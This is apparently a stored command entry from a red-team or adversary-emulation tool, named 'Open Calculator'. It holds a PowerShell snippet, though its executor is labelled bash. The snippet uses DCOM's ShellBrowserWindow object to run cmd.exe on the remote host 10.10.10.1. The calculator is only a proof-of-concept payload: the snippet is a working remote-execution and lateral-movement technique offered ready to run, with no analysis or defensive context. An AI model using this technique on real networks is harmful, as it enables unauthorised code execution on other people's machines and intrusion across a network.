---
id: 7694490b-141c-43f5-a89d-c001de8a2001
name: Open Calculator
type: command
executor: bash
data: '$com = [Type]::GetTypeFromCLSID(''C08AFD90-F2A1-11D1-8455-00A0C91F3880'',"10.10.10.1")

  $obj = [System.Activator]::CreateInstance($com)

  $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)'
output: null
created_at: '2023-04-06T03:56:07.185882+00:00'
updated_at: '2023-04-10T20:25:47.370083+00:00'
---

# Open Calculator

```bash
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```


